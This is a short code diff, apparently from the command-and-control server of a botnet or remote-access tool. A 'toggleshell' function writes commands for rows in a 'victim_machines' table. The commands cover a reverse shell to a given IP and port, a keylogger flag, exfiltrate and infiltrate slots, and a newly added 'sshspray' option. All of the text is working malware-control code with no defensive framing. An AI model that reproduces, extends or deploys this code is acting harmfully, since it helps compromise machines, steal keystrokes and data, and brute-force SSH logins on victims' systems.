@@ -66,7 +66,7 @@ def toggleshell( id, ip, port ):
 			seconds_from_epoch = int(time.time())
 			empty_json = "e30="
 			default_group_id = 1
-			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": 0, \"shell\": {\"ip\": \"" + ip + "\", \"port\": \"" + port + "\"}}"
+			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": \"0\", \"shell\": {\"ip\": \"" + ip + "\", \"port\": \"" + port + "\"}, \"sshspray\": \"0\"}"
 			formatted_encoded = encode(formatted_command)
 
 			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s, %s) """
